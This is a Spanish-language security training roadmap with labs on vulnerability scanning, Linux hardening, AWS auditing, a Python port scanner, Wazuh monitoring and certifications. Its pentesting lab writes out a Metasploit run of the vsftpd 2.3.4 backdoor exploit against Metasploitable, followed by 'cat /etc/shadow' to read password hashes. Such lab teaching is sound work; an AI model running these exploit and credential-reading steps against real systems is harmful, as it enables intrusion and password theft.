# Roadmap de Seguridad de la Información

Esta hoja de ruta está diseñada para proporcionar habilidades prácticas y accionables alineadas con las demandas actuales de la industria de ciberseguridad (2024+).

# 1. Gestión de Vulnerabilidades (Vulnerability Management)
## Preguntas Clave
A. ¿Qué tan fácilmente pueden los atacantes explotar la vulnerabilidad?
B. ¿Existen parches disponibles que solucionen la vulnerabilidad?
C. ¿Qué tipo de datos expone la vulnerabilidad?
D. ¿A cuántos sistemas afecta esta vulnerabilidad?

## 🧪 Laboratorio Práctico: Escaneo y Análisis
**Objetivo:** Identificar vulnerabilidades en un entorno controlado y aprender a priorizarlas.
1. **Configuración:**
   - Instala una máquina virtual vulnerable (ej. [Metasploitable2](https://sourceforge.net/projects/metasploitable/) o [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)).
   - Instala una herramienta de escaneo: **Nessus Essentials** (gratuito) o **OpenVAS** (Greenbone).
2. **Ejercicio:**
   - Realiza un escaneo de red ("Basic Network Scan") contra la IP de la máquina vulnerable.
   - Exporta el reporte en formato PDF y CSV.
   - **Tarea de Análisis:**
     - Filtra las vulnerabilidades con CVSS > 9.0 (Críticas).
     - Investiga el CVE de una de ellas en [NIST NVD](https://nvd.nist.gov/).
     - Redacta un pequeño párrafo explicando el impacto de negocio si esa vulnerabilidad fuera explotada.

---

# 2. Pruebas de Penetración (Penetration Testing)
## Las 4 Fases Principales
1. **Planificación:** Definir alcance (scope), objetivos, sistemas objetivo y reglas de compromiso (RoE).
2. **Recolección de Información (Information Gathering/OSINT):** Obtener datos públicos, DNS, subdominios.
3. **Testeo y Explotación:** Identificar vectores de ataque y ejecutarlos.
4. **Reporte:** Documentar hallazgos técnicos y resúmenes ejecutivos con recomendaciones de remediación.

### 🛠️ Herramientas Esenciales
- **Reconocimiento:** Nmap, Masscan, Amass, TheHarvester.
- **Web:** Burp Suite Community, OWASP ZAP, Nikto.
- **Active Directory:** BloodHound, CrackMapExec/NetExec.
- **Explotación:** Metasploit Framework, Searchsploit.
- **Post-Explotación:** Mimikatz, LinPEAS/WinPEAS.

## 🧪 Laboratorio Práctico: Ataque Controlado
**Objetivo:** Comprender el ciclo de explotación desde el escaneo hasta la shell.
1. **Reconocimiento:**
   - `nmap -sC -sV -p- <IP_TARGET> -oN nmap_result.txt`
2. **Búsqueda de Exploits:**
   - Identifica una versión vulnerable (ej. vsftpd 2.3.4 en Metasploitable).
   - `searchsploit vsftpd 2.3.4`
3. **Explotación con Metasploit:**
   ```bash
   msfconsole
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOSTS <IP_TARGET>
   run
   ```
4. **Ejercicio de Post-Explotación (Básico):**
   - Una vez dentro, ejecuta `whoami`, `id`, y `cat /etc/shadow` para entender el nivel de acceso obtenido.

---

# 3. Seguridad del Sistema (System Hardening)
**Enfoque:** Reducir la superficie de ataque en servidores Linux/Windows.

## Checklist de Hardening
1. **Gestión de Parches:** Automatizar actualizaciones (`unattended-upgrades`).
2. **Principio de Menor Privilegio:** Usuarios no-root para tareas diarias.
3. **Red:** Firewall configurado (Deny All Inbound por defecto).
4. **SSH Hardening:** No root login, solo llaves SSH.
5. **Auditoría:** Habilitar logs (auditd, Sysmon).

## 🧪 Laboratorio Práctico: Asegurando un Servidor Linux
**Objetivo:** Aplicar controles de seguridad en un servidor Ubuntu/Debian.
1. **Firewall (UFW):**
   ```bash
   sudo ufw default deny incoming
   sudo ufw default allow outgoing
   sudo ufw allow 2222/tcp  # Puerto SSH personalizado
   sudo ufw enable
   ```
2. **SSH Hardening (`/etc/ssh/sshd_config`):**
   - `Port 2222`
   - `PermitRootLogin no`
   - `PasswordAuthentication no` (Requiere haber copiado tu id_rsa.pub antes).
   - `PubkeyAuthentication yes`
3. **Intrusion Prevention (Fail2Ban):**
   - Instala: `sudo apt install fail2ban`
   - Configura `jail.local` para banear IPs tras 5 intentos fallidos de SSH.

---

# 4. Seguridad en la Nube (Cloud Security) - ¡Alta Demanda!
**Contexto:** La mayoría de las empresas operan en AWS, Azure o GCP.

## Conceptos Clave
- **IAM (Identity and Access Management):** Gestión de permisos. Nunca usar el usuario "Root" para tareas diarias.
- **S3 Buckets:** Almacenamiento. Evitar que sean públicos por error.
- **Security Groups:** Firewalls virtuales.

## 🧪 Laboratorio Práctico: AWS Free Tier
**Objetivo:** Auditar y asegurar una cuenta básica de AWS.
1. **IAM Seguro:**
   - Crea un usuario IAM con permisos de administrador pero **MFA activado**.
   - Elimina las "access keys" del usuario root.
2. **S3 Audit:**
   - Crea un bucket S3.
   - Intenta acceder a él desde una ventana de incógnito.
   - Asegúrate de que "Block Public Access" esté activado.
3. **CloudTrail:**
   - Habilita AWS CloudTrail (capa gratuita) para tener logs de todo lo que ocurre en tu cuenta.

---

# 5. Automatización y Scripting
**Contexto:** Los analistas modernos necesitan automatizar tareas repetitivas.

## Herramientas
- **Python:** Para interactuar con APIs, analizar logs y crear herramientas custom.
- **Bash:** Para automatización de sistemas Linux.

## 🧪 Laboratorio Práctico: Port Scanner en Python
**Objetivo:** Crear una herramienta básica de seguridad.
Crea un archivo `scanner.py`:
```python
import socket
import sys

target = sys.argv[1]
print(f"Escaneando objetivo: {target}")

try:
    for port in range(1, 100): # Escanea puertos del 1 al 100
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            print(f"Puerto {port} está ABIERTO")
        s.close()
except KeyboardInterrupt:
    print("\nSaliendo...")
    sys.exit()
```
*Ejecútalo contra tu máquina virtual de pruebas.*

---

# 6. Blue Team y Monitoreo (SOC)
**Contexto:** Detectar ataques es tan importante como prevenirlos.

## 🧪 Laboratorio Práctico: Detección de Intrusos
**Objetivo:** Ver los logs generados por tus ataques.
1. **Wazuh (SIEM/XDR Open Source):**
   - Si tienes recursos (8GB RAM), instala **Wazuh** en una VM (Docker es la forma más rápida).
   - Instala el agente Wazuh en tu máquina Linux "hardenizada".
2. **Prueba:**
   - Realiza intentos fallidos de SSH contra la máquina.
   - Observa las alertas generadas en el dashboard de Wazuh.
   - **Reto:** Crea una regla personalizada para que te avise si alguien usa `sudo`.

---

# 7. Ruta de Certificaciones Recomendada
Si buscas validar tus conocimientos, este es un camino estándar:
1. **Nivel Entrada:**
   - **CompTIA Security+:** Fundamentos teóricos sólidos.
   - **eJPT (eLearnSecurity):** 100% práctico, ideal para empezar en Pentesting.
2. **Nivel Intermedio:**
   - **BTL1 (Blue Team Level 1):** Para roles defensivos/SOC.
   - **OSCP (OffSec):** El estándar de oro para Pentesting (muy difícil).
   - **AWS Certified Security - Specialty:** Para especializarse en nube.